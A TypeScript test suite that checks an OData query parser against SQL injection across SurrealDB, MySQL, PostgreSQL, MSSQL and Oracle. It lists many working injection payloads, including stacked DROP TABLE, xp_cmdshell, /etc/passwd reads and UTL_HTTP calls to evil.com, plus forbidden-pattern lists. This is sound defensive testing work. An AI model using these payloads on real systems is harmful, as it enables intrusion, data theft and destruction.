import { describe, expect, it } from 'bun:test';
import { createQuery, SQLLang } from '../parser/main';
import { renderQuery } from '../parser/query-renderer';
import { ODataV4ParseError } from '../parser/utils';

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

function getSurQL(query: string, options = {}) {
    try {
        const parsed = createQuery(query, { type: SQLLang.SurrealDB, ...options });
        const result = renderQuery(parsed, 'test_table');
        return {
            countQuery: result.countQuery.toString(),
            entriesQuery: result.entriesQuery.toString(),
            parameters: result.parameters,
            where: parsed.where
        };
    } catch (e: any) {
        if (e instanceof ODataV4ParseError || e.message?.includes('Parse error')) {
            throw e;
        }
        throw e;
    }
}


function getSQLForDialect(query: string, dialect: SQLLang, options = {}) {
    try {
        const parsed = createQuery(query, { type: dialect, ...options });
        if (dialect === SQLLang.SurrealDB) {
            const result = renderQuery(parsed, 'test_table');
            return {
                where: parsed.where,
                select: parsed.select,
                orderby: parsed.orderby,
                parameters: result.parameters,
                fullQuery: result.entriesQuery.toString()
            };
        } else {
            return {
                where: parsed.where,
                select: parsed.select,
                orderby: parsed.orderby,
                parameters: Object.fromEntries(parsed.parameters),
                fullQuery: parsed.where
            };
        }
    } catch (e: any) {
        if (e instanceof ODataV4ParseError || e.message?.includes('Parse error')) {
            throw e;
        }
        throw e;
    }
}

function testAllDialects(query: string, options = {}) {
    const dialects = [
        SQLLang.SurrealDB,
        SQLLang.ANSI,
        SQLLang.MsSql,
        SQLLang.MySql,
        SQLLang.PostgreSql,
        SQLLang.Oracle
    ];

    const results: Record<string, any> = {};

    for (const dialect of dialects) {
        try {
            results[SQLLang[dialect]] = getSQLForDialect(query, dialect, options);
        } catch (e) {
            results[SQLLang[dialect]] = { error: e };
        }
    }

    return results;
}

const verifySecurity = (payload: string, forbiddenSubstring?: string) => {
    const query = `$filter=Name eq '${payload}'`;
    try {
        const result = getSurQL(query);
        expect(result.parameters['$literal1']).toBeDefined();

        if (forbiddenSubstring) {
            expect(result.entriesQuery).not.toContain(forbiddenSubstring);
        }
    } catch (e: any) {
        if (e instanceof ODataV4ParseError || e.message?.includes('Parse error')) {
            return;
        }
        throw e;
    }
};

const verifySecurityAllDialects = (payload: string, forbiddenPatterns: string[] = []) => {
    const query = `$filter=Name eq '${payload}'`;
    const results = testAllDialects(query);

    for (const [dialect, result] of Object.entries(results)) {
        if (result.error) {
            expect(result.error instanceof ODataV4ParseError ||
                result.error.message?.includes('Parse error')).toBe(true);
        } else {
            expect(result.parameters).toBeDefined();

            for (const pattern of forbiddenPatterns) {
                if (result.fullQuery) {
                    expect(result.fullQuery.toLowerCase()).not.toContain(pattern.toLowerCase());
                }
            }
        }
    }
};


const booleanPayloads = [
    "x' OR 1=1",
    "x' OR 1=1 --",
    "x' OR TRUE --",
    "x' AND 1=0 --",
    "x' OR '1'='1",
    "1' OR '1'='1",
    "x' OR (1=1)",
    "x') OR ('1'='1",
    "x' OR 'x'='x",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1'--",
    "\") OR (\"1\"=\"1\"--",
    "admin' OR '1'='1",
    "admin') OR ('1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' {",
    "' OR '1'='1' /*",
    "1' OR '1' = '1",
    "1' OR '1' = '1' --",
    "x' OR 1=1 AND 'a'='a",
    "' OR 1=1 LIMIT 1 --",
    "') OR 1=1 LIMIT 1 --",
    "' OR '1'='1'--",
    ") OR ('a'='a",
    "')OR('a'='a",
    "a' OR 1=1 --",
    "a' OR 1=1#",
    "a' OR 1=1/*",
    "' OR 1=1 -- -",
    "' OR 'a'='a",
];

describe('Comprehensive SQLi - Boolean-Based (All Dialects)', () => {
    it.each(booleanPayloads)('should be secure against boolean payload: %s', (payload) => {
        verifySecurityAllDialects(payload, ['OR 1=1', 'OR TRUE', 'OR \'1\'=\'1\'']);
    });
});

describe('Comprehensive SQLi - Union-Based (All Dialects)', () => {
    const unionPayloads = [
        "x' UNION SELECT 1,2,3 --",
        "x' UNION ALL SELECT * FROM users --",
        "x' UNION SELECT username, password FROM users --",
        "x' UNION SELECT NULL, NULL, NULL --",
        "' UNION SELECT @@version--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns--",
        "x' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
        "+ UNION SELECT 1,2,3 --",
        "x' UNION ALL SELECT 'a','b','c' --",
        "' UNION SELECT user(), database(), version() --",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
        "x' UNION SELECT load_file('/etc/passwd') --",
        "' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt' --",
        "' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b --",
    ];

    it.each(unionPayloads)('should be secure against union payload: %s', (payload) => {
        verifySecurityAllDialects(payload, ['UNION', 'UNION SELECT', 'UNION ALL']);
    });
});

describe('Comprehensive SQLi - Comment Injection (All Dialects)', () => {
    const commentPayloads = [
        "x' -- comment",
        "x' # comment",
        "x' /* comment */",
        "x' // comment",
        "x'--",
        "x'#",
        "x'/*",
        "admin'--",
        "admin'#",
        "admin'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "x'-- -",
        "x'/*!50000 comment */",
        "x'--+",
    ];

    it.each(commentPayloads)('should be secure against comment payload: %s', (payload) => {
        verifySecurity(payload);
    });
});

describe('Comprehensive SQLi - Stacked Queries (All Dialects)', () => {
    const stackedPayloads = [
        "x'; DROP TABLE users --",
        "x'; DELETE FROM users WHERE 1=1 --",
        "x'; INSERT INTO users VALUES ('hacker','pass') --",
        "x'; UPDATE users SET role='admin' --",
        "x'; EXEC xp_cmdshell('dir') --",
        "x'| ls",
        "x'; SHUTDOWN --",
        "'; DROP TABLE test; --",
        "1; DROP TABLE users",
        "'; CREATE TABLE test(id int); --",
        "'; ALTER TABLE users ADD COLUMN hacked int; --",
        "x'; TRUNCATE TABLE sessions; --",
    ];

    it.each(stackedPayloads)('should be secure against stacked query: %s', (payload) => {
        verifySecurityAllDialects(payload, ['DROP TABLE', 'DELETE FROM', 'INSERT INTO', 'UPDATE', 'EXEC', 'SHUTDOWN', 'CREATE TABLE', 'ALTER TABLE', 'TRUNCATE']);
    });
});

describe('Comprehensive SQLi - Time-Based Blind (Dialect Specific)', () => {
    const timeBasedPayloads = [
        // MySQL
        "x' OR sleep(5) --",
        "x' OR BENCHMARK(1000000,MD5(1)) --",
        "x' AND SLEEP(5)--",
        "x' AND IF(1=1,SLEEP(5),0)--",
        "x'; SELECT SLEEP(5)--",
        // PostgreSQL
        "x' OR pg_sleep(5) --",
        "x'; SELECT pg_sleep(5)--",
        "x' AND pg_sleep(5)>0--",
        // MSSQL
        "x'; WAITFOR DELAY '00:00:05'--",
        "x' OR WAITFOR DELAY '00:00:05'--",
        "x' AND WAITFOR DELAY '00:00:05'--",
        // Oracle
        "x' OR DBMS_LOCK.SLEEP(5)--",
        "x' AND DBMS_LOCK.SLEEP(5)=1--",
        // SurrealDB
        "x' OR time::now() --",
    ];

    it.each(timeBasedPayloads)('should be secure against time-based payload: %s', (payload) => {
        verifySecurity(payload);
    });
});

describe('Comprehensive SQLi - Error-Based (All Dialects)', () => {
    const errorPayloads = [
        "x' AND 1=CONVERT(int, (SELECT @@version))--",
        "x' AND 1=1/0--",
        "x' AND extractvalue(1,concat(0x7e,version()))--",
        "x' AND updatexml(1,concat(0x7e,version()),1)--",
        "x' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "x' AND EXP(~(SELECT * FROM (SELECT 1)a))--",
        "x' AND GTID_SUBSET(version(),1)--",
        "x' AND JSON_KEYS((SELECT CONCAT('[',version(),']')))--",
    ];

    it.each(errorPayloads)('should be secure against error-based payload: %s', (payload) => {
        verifySecurityAllDialects(payload, ['CONVERT', 'extractvalue', 'updatexml', 'CONCAT']);
    });
});

describe('Comprehensive SQLi - Polyglot Payloads (Cross-Dialect)', () => {
    const polyglotPayloads = [
        "' OR 1=1 -- ",
        "' OR '1'='1' --",
        "1' OR '1' = '1' {",
        "' OR 1=1#",
        "\" OR \"\"=\"",
        "') OR ('1'='1",
        "admin'--",
        "admin'#",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or ('1'='1--",
        ") or ('1'='1--",
        "') or ('1'='1'--",
        "\") or (\"1\"=\"1--",
        "' OR 'x'='x",
        "') OR 'x'='x",
        "\") OR \"x\"=\"x",
        "1 OR 1=1",
        "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
        "' OR '1",
        "' OR 1 -- -",
        "\" OR 1 = 1 --",
    ];

    it.each(polyglotPayloads)('should be secure against polyglot payload: %s', (payload) => {
        verifySecurityAllDialects(payload, ['OR 1=1']);
    });
});

describe('Backtick & Escape Sequence Stress Tests', () => {
    const specialPayloads = [
        "foo`bar",
        "foo\\`bar",
        "foo%60bar",
        "\\",
        "\\\\",
        "`",
        "```",
        "`; DROP TABLE x; --",
        "admin` --",
        "\\\\\\\\\\\\",
        "\\'",
        "\\\"",
        "\\n\\r\\t",
        "test\\'test",
        "test\\\"test",
        "test\\\\test",
        "C:\\\\Users\\\\test",
        "/etc/passwd",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
    ];

    it.each(specialPayloads)('should safely handle special payload: %s', (payload) => {
        verifySecurity(payload);
    });
});

describe('MySQL-Specific Injection Vectors', () => {
    const mysqlPayloads = [
        "x' AND LOAD_FILE('/etc/passwd')--",
        "x' INTO OUTFILE '/tmp/out.txt'--",
        "x' AND 1=2 UNION SELECT * INTO OUTFILE '/tmp/test.txt'--",
        "x' /*!UNION*/ /*!SELECT*/ 1,2,3--",
        "x' /*!50000UNION*/ /*!50000SELECT*/ 1--",
        "x' AND MID(version(),1,1)='5'--",
        "x' AND DATABASE()='test'--",
        "x' AND USER() LIKE 'root@%'--",
        "x' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ];

    it.each(mysqlPayloads)('should be secure against MySQL payload: %s', (payload) => {
        verifySecurityAllDialects(payload, ['LOAD_FILE', 'INTO OUTFILE', 'DATABASE()', 'USER()']);
    });
});

describe('PostgreSQL-Specific Injection Vectors', () => {
    const postgresPayloads = [
        "x'; COPY users TO '/tmp/users.txt'--",
        "x' AND pg_read_file('/etc/passwd')=1--",
        "x' AND pg_ls_dir('.')=1--",
        "x'; CREATE TABLE test(data text); COPY test FROM '/etc/passwd'; SELECT * FROM test--",
        "x' AND current_user='postgres'--",
        "x' AND current_database()='test'--",
        "x' AND version() LIKE '%PostgreSQL%'--",
    ];

    it.each(postgresPayloads)('should be secure against PostgreSQL payload: %s', (payload) => {
        verifySecurityAllDialects(payload, ['COPY', 'pg_read_file', 'pg_ls_dir']);
    });
});

describe('MSSQL-Specific Injection Vectors', () => {
    const mssqlPayloads = [
        "x'; EXEC xp_cmdshell('whoami')--",
        "x' AND 1=2 UNION ALL SELECT NULL, EXEC('whoami')--",
        "x'; EXEC sp_configure 'xp_cmdshell',1--",
        "x' UNION SELECT * FROM OPENROWSET('SQLOLEDB','Server=evil;UID=sa;PWD=pass','SELECT * FROM sys.databases')--",
        "x' AND system_user='sa'--",
        "x' AND db_name()='master'--",
        "x' AND (SELECT @@version)--",
        "x'; EXEC sp_addsrvrolemember 'test','sysadmin'--",
    ];

    it.each(mssqlPayloads)('should be secure against MSSQL payload: %s', (payload) => {
        verifySecurityAllDialects(payload, ['xp_cmdshell', 'EXEC', 'OPENROWSET', 'sp_configure']);
    });
});

describe('Oracle-Specific Injection Vectors', () => {
    const oraclePayloads = [
        "x' AND UTL_HTTP.request('http://evil.com')='x'--",
        "x' AND UTL_FILE.put_line('x','x')='x'--",
        "x' AND DBMS_EXPORT_EXTENSION.get_domain_index_tables('x','x','x','x','x')='x'--",
        "x' AND (SELECT user FROM dual)='SYSTEM'--",
        "x' AND (SELECT banner FROM v$version WHERE rownum=1)--",
        "x' AND DBMS_PIPE.RECEIVE_MESSAGE('a',10)='a'--",
    ];

    it.each(oraclePayloads)('should be secure against Oracle payload: %s', (payload) => {
        verifySecurityAllDialects(payload, ['UTL_HTTP', 'UTL_FILE', 'DBMS_']);
    });
});

describe('OData Parameter Injection - $top and $skip', () => {
    it('should reject injection in $top', () => {
        const query = "$top=1; DROP TABLE users";
        expect(() => getSurQL(query)).toThrow();
    });

    it('should reject injection in $skip', () => {
        const query = "$skip=1 OR 1=1";
        expect(() => getSurQL(query)).toThrow();
    });

    it('should reject negative $top', () => {
        const query = "$top=-1";
        expect(() => getSurQL(query)).toThrow();
    });

    it('should reject negative $skip', () => {
        const query = "$skip=-1";
        expect(() => getSurQL(query)).toThrow();
    });

    it('should reject extremely large $top', () => {
        const query = "$top=999999999";
        expect(() => getSurQL(query)).toThrow();
    });

    it('should reject SQL in $top', () => {
        expect(() => getSurQL("$top=1 UNION SELECT * FROM users")).toThrow();
    });

    it('should reject SQL in $skip', () => {
        expect(() => getSurQL("$skip=1 UNION SELECT * FROM users")).toThrow();
    });

    it('should accept valid $top', () => {
        const result = getSurQL("$top=10");
        expect(result.entriesQuery).toContain('LIMIT 10');
    });

    it('should accept valid $skip', () => {
        const result = getSurQL("$skip=5");
        expect(result.entriesQuery).toContain('START 5');
    });
});

describe('OData Parameter Injection - $search', () => {
    it('should reject $search when disabled', () => {
        expect(() => getSurQL("$search=' OR 1=1")).toThrow();
    });

    it('should reject SQL injection in $search when enabled', () => {
        expect(() => getSurQL("$search=' UNION SELECT * FROM users", { enableSearch: true })).toThrow();
    });

    it('should reject stacked queries in $search', () => {
        expect(() => getSurQL("$search=test; DROP TABLE users", { enableSearch: true })).toThrow();
    });
});

describe('OData Parameter Injection - $expand', () => {
    it('should reject SQL injection in $expand filter', () => {
        expect(() => getSurQL("$expand=Tasks($filter=Id eq 1; DROP TABLE tasks)")).toThrow();
    });

    it('should reject SQL injection in nested expand', () => {
        expect(() => getSurQL("$expand=Tasks($expand=SubTasks($filter=1=1 OR 1=1))")).toThrow();
    });
});

describe('OData Parameter Injection - $count', () => {
    it('should reject SQL in $count', () => {
        expect(() => getSurQL("$count=true OR 1=1")).toThrow();
    });

    it('should accept valid $count', () => {
        const result1 = getSurQL("$count=true");
        const result2 = getSurQL("$count=false");
        expect(result1).toBeDefined();
        expect(result2).toBeDefined();
    });
});

describe('OData Parameter Injection - $format', () => {
    it('should reject SQL in $format', () => {
        expect(() => getSurQL("$format=json'; DROP TABLE users--")).toThrow();
    });

    it('should accept valid $format', () => {
        const result = getSurQL("$format=json");
        expect(result).toBeDefined();
    });
});

describe('OData Parameter Injection - $id', () => {
    it('should reject SQL injection in $id', () => {
        // It might not throw, but it should definitely not include the injection in the output
        try {
            const result = getSurQL("$id=123' OR '1'='1");
            expect(result.entriesQuery).not.toContain("OR '1'='1");
        } catch (e) {
            // Throwing is also acceptable
            expect(true).toBe(true);
        }
    });

    it('should accept valid $id', () => {
        const result = getSurQL("$id=123");
        expect(result).toBeDefined();
    });
});

describe('Second-Order Injection Patterns', () => {
    it('should safely handle data with SQL keywords', () => {
        const result = getSurQL("$filter=Comment eq 'SELECT * FROM users WHERE 1=1'");
        expect(result.parameters['$literal1']).toContain('SELECT * FROM users');
    });

    it('should safely handle data with DROP statements', () => {
        const result = getSurQL("$filter=Description eq 'DROP TABLE users'");
        expect(result.parameters['$literal1']).toBe('DROP TABLE users');
    });

    it('should safely handle stored XSS payloads', () => {
        const result = getSurQL("$filter=Content eq '<script>alert(1)</script>'");
        expect(result.parameters['$literal1']).toContain('<script>');
    });

    it('should safely handle field-like names in data', () => {
        const result = getSurQL("$filter=Field eq 'user->friends->name'");
        expect(result.parameters['$literal1']).toBe('user->friends->name');
    });
});

describe('Null Byte and Control Character Injection', () => {
    it('should handle various control characters', () => {
        const controlChars = [
            'test\\x00', 'test\\x01', 'test\\x02', 'test\\x03',
            'test\\x04', 'test\\x05', 'test\\x1F'
        ];

        for (const char of controlChars) {
            try {
                getSurQL(`$filter=Name eq '${char}'`);
            } catch (e) {
                expect(e).toBeDefined();
            }
        }
    });
});

describe('Multi-Byte Character Injection', () => {
    it('should safely handle various unicode', () => {
        const unicodeTests = [
            { input: '测试', desc: 'Chinese' },
            { input: '😀🔥', desc: 'Emoji' },
            { input: 'test测试😀', desc: 'Mixed' },
            { input: 'Прив ет', desc: 'Cyrillic' },
            { input: 'مرحبا', desc: 'Arabic' },
            { input: 'שלום', desc: 'Hebrew' },
        ];

        for (const test of unicodeTests) {
            const result = getSurQL(`$filter=Name eq '${test.input}'`);
            expect(result.parameters['$literal1']).toBe(test.input);
        }
    });
});

describe('Edge Cases and Boundary Testing', () => {
    it('should handle empty string', () => {
        const result = getSurQL("$filter=Name eq ''");
        expect(result.parameters['$literal1']).toBe('');
    });

    it('should handle single quote escape', () => {
        const result = getSurQL("$filter=Name eq ''''");
        expect(result.parameters['$literal1']).toBe("'");
    });

    it('should handle very long field names', () => {
        const longField = 'a'.repeat(255);
        try {
            getSurQL(`$filter=${longField} eq 'test'`);
        } catch (e) {
            // May fail validation
            expect(e).toBeDefined();
        }
    });

    it('should handle deeply nested boolean expressions', () => {
        const deep = "((((Name eq 'a') and (Age gt 1)) or ((City eq 'b') and (State eq 'c'))) and (Country eq 'd'))";
        const result = getSurQL(`$filter=${deep}`);
        expect(result).toBeDefined();
    });

    it('should handle mix of operators', () => {
        const result = getSurQL("$filter=Age gt 18 and Age lt 65 and Name ne 'test' and Active eq true");
        expect(result.where).toBeDefined();
    });

    it('should reject malformed syntax', () => {
        expect(() => getSurQL("$filter=Name eq 'test' AND Age gt; DROP TABLE users")).toThrow();
    });
});

describe('Additional SurrealDB-Specific Edge Cases', () => {
    it('should safely handle graph notation in strings', () => {
        const tests = [
            'user->friends',
            'table:record',
            'person:john->knows->person:jane',
            '<-follows->',
        ];

        for (const test of tests) {
            const result = getSurQL(`$filter=Path eq '${test}'`);
            expect(result.parameters['$literal1']).toBe(test);
        }
    });

    it('should reject dangerous function calls in comparisons', () => {
        const dangerous = [
            'session::id()',
            'session::ip()',
            'session::origin()',
            'session::user()',
        ];

        for (const func of dangerous) {
            expect(() => getSurQL(`$filter=${func} eq 'test'`)).toThrow();
        }
    });
});

describe('Encoding Bypass Attempts', () => {
    it('should handle various encoding attempts', () => {
        const encodings = [
            '%27%20OR%201=1',  // URL encoded  ' OR 1=1
            '%2527%2520OR%25201=1',  // Double URL encoded
            '%u0027%u0020OR%u00201=1',  // Unicode URL encoding
        ];

        for (const enc of encodings) {
            // These should either throw or be safely treated as literal strings
            try {
                const result = getSurQL(`$filter=Name eq '${enc}'`);
                expect(result.parameters['$literal1']).toBeDefined();
            } catch (e: any) {
                expect(e instanceof ODataV4ParseError || e.message?.includes('Parse error') || e.name === 'URIError').toBe(true);
            }
        }
    });
});

describe('Case Sensitivity Bypass Attempts', () => {
    it('should handle mixed case SQL keywords in filter values', () => {
        const mixedCasePayloads = [
            'SeLeCt * FrOm users',
            'UnIoN sElEcT 1,2,3',
            'DrOp TaBlE users',
            'ExEc xp_cmdshell',
        ];

        for (const payload of mixedCasePayloads) {
            const result = getSurQL(`$filter=Name eq '${payload}'`);
            expect(result.parameters['$literal1']).toBe(payload);
        }
    });
});

describe('Filter Function Security', () => {
    it('should allow safe OData functions', () => {
        const safeFunctions = [
            "contains(Name, 'test')",
            "startswith(Name, 'admin')",
            "endswith(Email, '@example.com')",
            "length(Name) gt 5",
            "tolower(Name) eq 'admin'",
            "toupper(Name) eq 'ADMIN'",
            "trim(Name) eq 'test'",
            "concat(concat(FirstName, ' '), LastName)",
            "substring(Name, 0, 5)",
            "indexof(Email, '@')",
            "year(BirthDate) eq 1990",
            "month(BirthDate) eq 12",
            "day(BirthDate) eq 25",
            "round(Price)",
            "floor(Price)",
            "ceiling(Price)",
        ];

        for (const func of safeFunctions) {
            expect(() => getSurQL(`$filter=${func}`)).not.toThrow();
        }
    });

    it('should reject unsafe function-like patterns', () => {
        const unsafeFunctions = [
            "eval('alert(1)')",
            "exec('rm -rf /')",
            "system('whoami')",
            "shell('ls')",
            "javascript:alert(1)",
        ];

        for (const func of unsafeFunctions) {
            expect(() => getSurQL(`$filter=${func}`)).toThrow();
        }
    });
});
